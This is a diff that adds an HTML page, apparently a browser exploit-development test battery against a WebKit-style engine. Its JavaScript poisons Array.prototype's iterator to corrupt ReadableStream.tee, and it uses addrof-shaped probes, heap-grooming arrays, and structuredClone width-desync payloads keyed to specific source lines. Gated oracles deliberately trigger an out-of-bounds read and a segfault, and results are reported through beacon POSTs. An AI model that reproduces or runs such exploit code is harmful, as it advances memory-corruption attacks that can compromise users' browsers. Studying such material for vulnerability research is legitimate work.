@@ -1,0 +1,201 @@
+<!doctype html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v11 FULL-BATTERY — S2-fix (V3-proven INV) + B1 width-desync ladder S4a/b/c/d + gated oracles X1/S9</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v11</pre>
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>
+(function(){
+"use strict";
+/* FA-v11 FULL-BATTERY — 2026-10-15 postmortem leg.
+   Reglas: V3-proven stage code (fetch-async, factory poisons, INV 2º tras C0);
+   S4 = B1 width-desync ladder (S4a ctrl WRONG-VALUE, S4b split-253 DS-shape,
+   S4c split-255 KIMI-shape, S4d oraculo u32 gated ?b=2); X1 gated ?x=1..6
+   (sync beacons, CERO allocs en ventana seed->trigger); S9 gated ?s9=1;
+   HB 2s; HB-gap>4s sin Z = crash-class; Z terminal. */
+var RID = "v11" + Date.now().toString(36).slice(-18);
+var QS = String(location.search || "");
+function qn(n,d){ var m = QS.match(new RegExp("[?&]"+n+"=([0-9]+)")); return m ? (parseInt(m[1],10)||0) : d; }
+var BMODE = qn("b",0), XMODE = qn("x",0), S9MODE = qn("s9",0);
+var out = document.getElementById("out");
+function say(s){ try{ out.appendChild(document.createTextNode("\n"+s)); }catch(e){} }
+function bk(st, body){
+  try{ fetch("/beacon/V11-"+st, { method:"POST", cache:"no-store",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({r:RID, b:String(body).slice(0,180)}) }).catch(function(){}); }catch(e){}
+}
+function bks(st, body){ /* sync — SOLO X1 (window discipline: CERO async callbacks en ventana) */
+  try{ var x=new XMLHttpRequest(); x.open("POST","/beacon/V11-"+st,false);
+    x.setRequestHeader("Content-Type","application/json");
+    x.send(JSON.stringify({r:RID, b:String(body).slice(0,180)})); }catch(e){}
+}
+var OI = Array.prototype[Symbol.iterator];
+function restore(){ try{ Array.prototype[Symbol.iterator] = OI; }catch(e){} }
+function ord(id, label, poison, work){
+  try{ bk(id+"A", label);
+    if (poison){ try{ Array.prototype[Symbol.iterator] = poison(); }catch(e){ restore(); } }
+    var r = work();
+    restore();
+    bk(id+"B", "SURV "+String(r).slice(0,170));
+  }catch(e){
+    restore();
+    bk(id+"E", "ETYPE: "+String((e&&e.message)||e).slice(0,150));
+  }
+}
+/* ---- poison factories (V3-proven: factory-of-factory, >=2 objetos) ---- */
+function sameXTwice(tag){ var X={ourTag:tag}; window.__tgt = X;
+  return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:X, done:false}; } }; }; }
+function proxyRevoked(){ var pr=Proxy.revocable({},{}); pr.revoke();
+  return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:pr.proxy, done:false}; } }; }; }
+function bigintObj(){ var big=Object(0x14000000n);
+  return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:big, done:false}; } }; }; }
+function dateObj(){ var d=new Date();
+  return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:d, done:false}; } }; }; }
+function chainArr(){ var a=[]; for (var i=0;i<512;i++) a.push(Object(0x14000000n));
+  return function(){ var i=0,n=2; return { next:function(){ if(i>=n) return {done:true}; i++; return {value:a[511], done:false}; } }; }; }
+function realStream(){ return function(){ var i=0,n=2;
+  return { next:function(){ if(i>=n) return {done:true}; i++; return {value:new ReadableStream({}), done:false}; } }; }; }
+function overYield2(secondVal){
+  return function(){ var arr=this,i=0,n=arr.length+1;
+    return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:secondVal; i++; return {value:v, done:false}; } }; };
+}
+function underYieldOne(v){ return function(){ var i=0,n=1;
+  return { next:function(){ if(i>=n) return {done:true}; i++; return {value:v, done:false}; } }; }; }
+
+/* L — load + deriveRuntime (U5 cableado; DR-GAP tolerado, NUNCA run(p)) */
+try{ bk("L","loaded; deriveRuntime="+(typeof window.deriveRuntime)+"; b="+BMODE+"; x="+XMODE+"; s9="+S9MODE+"; ua="+navigator.userAgent.slice(0,40)); }catch(e){}
+try{ setInterval(function(){ bk("HB","hb"); }, 2000); }catch(e){}
+
+/* S0 — control limpio (V3-C0 exacto) */
+ord("S0","clean control no-poison", function(){ return function(){ var i=0,n=2;
+  return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{plain:1}, done:false}; } }; }; },
+  function(){ var rs=new ReadableStream({}); var p=rs.tee(); return "clean locked="+p[0].locked; });
+
+/* S2 — INVERSION: V3-INV byte-proven (factory poison, fetch, 2º tras C0, sin over-yield previo).
+   Object.keys(tgt) GUARDADO (S2-fix) para que jamas mate la etapa. */
+ord("S2","pidInverted same-X (V3-proven)", sameXTwice("v11-inv"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee(); var ft=false, st=false;
+  try{ p[0].cancel(); }catch(e){ ft=true; } try{ p[1].cancel(); }catch(e){ st=true; }
+  var tgt=window.__tgt, ks="";
+  try{ ks=Object.keys(tgt).join(","); }catch(e){ ks="E:"+(e&&e.name); }
+  return "pidInverted="+(ft&&!st)+"; locked="+p[0].locked+"; invKeys="+ks; });
+
+/* ORA — state-oracle readback */
+ord("ORA","state-oracle readback", sameXTwice("v11-ora"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  try{ p[0].getReader(); }catch(e){}
+  return "locked="+p[0].locked+"; gr="+(typeof p[0].getReader)+"; cr="+(typeof p[0].cancel)+"; second-locked="+p[1].locked; });
+
+/* S1 — over-yield MIMO-V2 (badge family-a) — DESPUES de la inversion (re-diagnosis S2) */
+ord("S1","over-yield MIMO-V2 (post-inversion)", overYield2({}), function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  return "locked="+p[0].locked+"; gl="+(typeof p[0].cancel); });
+
+/* S3 — cross-subsystem Response.clone (bifurcado a/b) */
+ord("S3a","TL-a Response.clone SIN getReader", sameXTwice("v11-tla"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  var resp=new Response(p[0]); var cl=resp.clone(); var bi=!!cl.body; var qr="";
+  try{ var gr=cl.body.getReader.call(cl.body); qr=typeof gr; }catch(e){ qr="TypeError:"+String((e&&e.message)||"").slice(0,60); }
+  return "bodyIs="+bi+"; readQr="+qr; });
+ord("S3b","TL-b Response.clone CON getReader (E-class esperada)", sameXTwice("v11-tlb"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee(); try{ p[0].getReader(); }catch(e){}
+  var resp=new Response(p[0]); var cl=resp.clone(); var bi=!!cl.body; var qr="";
+  try{ var gr=cl.body.getReader.call(cl.body); qr=typeof gr; }catch(e){ qr="TypeError:"+String((e&&e.message)||"").slice(0,60); }
+  return "bodyIs="+bi+"; readQr="+qr; });
+
+/* family-(a) keep-alives (V3-proven) */
+ord("PX","revoked-Proxy addrof-shape", proxyRevoked, function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  return "proxy-locked="+p[0].locked+"; gr="+(typeof p[0].getReader)+"; cl="+(typeof p[0].cancel); });
+ord("RP","revoked-Proxy 2nd shot", proxyRevoked, function(){
+  var rs=new ReadableStream({}); var p=rs.tee(); return "proxy2 locked="+p[0].locked; });
+ord("BI","BigInt-wrapper growth-marker", bigintObj, function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  return "bigInt locked="+p[0].locked+"; gr="+(typeof p[0].getReader); });
+ord("DT","Date negative-control", dateObj, function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  return "date locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+ord("CH","chainArr groom-pressure", chainArr, function(){
+  var rs=new ReadableStream({}); var p=rs.tee();
+  return "chainArr locked="+p[0].locked+"; typeof-cancel="+(typeof p[0].cancel); });
+ord("RS","sibling real-stream control", realStream, function(){
+  var wrapv=new ReadableStream({}); var wp=wrapv.tee();
+  return "realStream locked="+wp[0].locked+"; gr="+(typeof wp[0].getReader); });
+ord("TGT","seal readback", sameXTwice("v11-tgt"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee(); var tgt=window.__tgt, ks="";
+  try{ ks=Object.keys(tgt).join(","); }catch(e){ ks="E:"+(e&&e.name); }
+  return "tgt-keys="+ks+"; locked="+p[0].locked; });
+ord("S6","response-readback bodyIs+locked", sameXTwice("v11-s6"), function(){
+  var rs=new ReadableStream({}); var p=rs.tee(); try{ p[0].getReader(); }catch(e){}
+  var res2=new Response(p[0]); var cl2=res2.clone();
+  return "bodyIs="+!!cl2.body+"; locked="+p[0].locked; });
+ord("S8","canary 80-string class-128 sweep", overYield2({}), function(){
+  var strings=[]; for (var s=0;s<80;s++) strings.push("seed-string-"+s+" "+"a".repeat(16));
+  var rs=new ReadableStream({}); var pair=rs.tee();
+  return "canary 80 landed; locked="+pair[0].locked; });
+
+/* ---- S4: B1 width-desync ladder (structuredClone; poison-iterador irrelevante) ----
+   writer width por m_objectPool.size() (SerializedScriptValue.cpp:1899-1907);
+   reader por m_gcBuffer.size() (:2866-2883); raw heap-BigInt writer SIN pool
+   (:1441-1445) vs reader append (:4014/:4045/:4083) = unico divergente. */
+var BIGP = BigInt("0x10000000000000000");
+var XS = { s:"gate" };
+function cln(st, build, sig){
+  bk(st+"A","clone "+st);
+  var r;
+  try{ var c=structuredClone(build()); r=sig(c); }catch(e){ r="THREW:"+(e&&e.name)+":"+String((e&&e.message)||"").slice(0,70); }
+  bk(st+"B", String(r).slice(0,170));
+}
+/* S4a control N=1: writer index 1 = XS; reader m_gcBuffer[1] = BIGP ->
+   WRONG-VALUE:bigint = reader indexa m_gcBuffer LIVE (precondicion del desync). */
+cln("S4a","ctrl N=1 raw-BigInt + [X,X]", function(){ return [BIGP, XS, XS]; }, function(c){
+  var last=c[c.length-1];
+  return "len="+c.length+"; last="+((last===XS)?"IDENTITY":("WRONG-VALUE:"+typeof last)); });
+/* S4b split-253 DS-shape {a:A253,x:S,y:S}: writer u8 vs reader u16 (DS-B1-FIX).
+   E-class = split LIVE; clean = DS-model refutado (discrimina DS vs KIMI). */
+cln("S4b","split-253 DS-shape", function(){
+  var A=[]; for (var i=0;i<253;i++) A.push({i:i,p:0x1FFFFFFFFFFFFFn});
+  return {a:A, x:XS, y:XS}; }, function(c){
+  return "a.len="+c.a.length+"; dedup="+(c.x===c.y)+"; x.s="+(c.x&&c.x.s); });
+/* S4c split-255 KIMI-shape [255 raw-BigInt, X, X]: BOTH modelos -> u16 ->
+   [01 FF]=0xFF01 >= size -> jsUndefined + ValidationError (catchable).
+   E-class = width-split LIVE(b) modelo-inmune. */
+cln("S4c","split-255 KIMI-shape", function(){
+  var arr=[]; for (var i=0;i<255;i++) arr.push(BIGP+BigInt(i));
+  arr.push(XS); arr.push(XS); return arr; }, function(c){
+  return "len="+c.length+"; dedup="+(c[254]===c[255])+"; last="+(typeof c[255]); });
+/* S4d ORACLE (gated ?b=2, single-shot): u32 [01 FF FF FF]=0xFFFFFF01 -> at(-255)
+   = m_buffer[-255] OOB-read -> crash-class esperada (HB-gap>4s sin S4dB/Z). */
+if (BMODE===2) cln("S4d","ORACLE-65540 raw pads (at(-255))", function(){
+  var arr=[]; for (var i=0;i<65540;i++) arr.push(BIGP+BigInt(i));
+  arr.push(XS); arr.push(XS); return arr; }, function(c){ return "len="+c.length; });
+
+/* X1 classifier (gated ?x=1..6; sync beacons; CERO allocs seed->trigger) */
+if (XMODE>=1 && XMODE<=6) (function(){
+  var d=XMODE; bks("X1A","x"+d);
+  var seed=function(){ var rs=new ReadableStream({}); return rs.tee()[0].locked; };
+  var pf=underYieldOne({e:0});
+  var trig=function(){ var res="n/a";
+    try{ Array.prototype[Symbol.iterator]=pf;
+      var p=new ReadableStream({}).tee(); var g;
+      try{ g=typeof p[1].getReader(); }catch(e){ g="E:"+String((e&&e.message)||"").slice(0,40); }
+      res="len="+p.length+"; p2locked="+p[0].locked+"; gr2="+g; }catch(e){ res="E:"+(e&&e.name); }
+    restore(); return res; };
+  var r;
+  if(d===1){ seed(); r=trig(); }
+  else if(d===2){ seed(); var s=[]; for(var i=0;i<100;i++) s.push({n:i}); r=trig(); }
+  else if(d===3){ seed(); var f=[]; for(var k=0;k<8;k++) f.push([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]); r=trig(); }
+  else if(d===4){ seed(); var q=[window.__tgt,1,2,3,4,5,6,7,8,9,10,11,12,13,14]; r=trig(); }
+  else if(d===5){ seed(); trig(); seed(); r=trig(); }
+  else { r=trig(); }
+  bks("X1B","x"+d+" "+String(r).slice(0,140));
+})();
+
+/* S9 CRASH-ORACLE (gated ?s9=1, ABSOLUTO-ultimo): under-yield 1 -> results[1] size-1
+   -> SEGV IRS.cpp:195 -> sin S9B; HB-gap>4s = crash-class. */
+if (S9MODE===1) ord("S9","CRASH-ORACLE under-yield (single-shot)", underYieldOne(0x1337),
+  function(){ var rs=new ReadableStream({}); var p=rs.tee(); return "no-crash (zombie slot)"; });
+
+bk("Z","FA-v11 battery complete b="+BMODE+" x="+XMODE+" s9="+S9MODE);
+say("FA-v11 battery complete");
+})();
+</script></body></html>
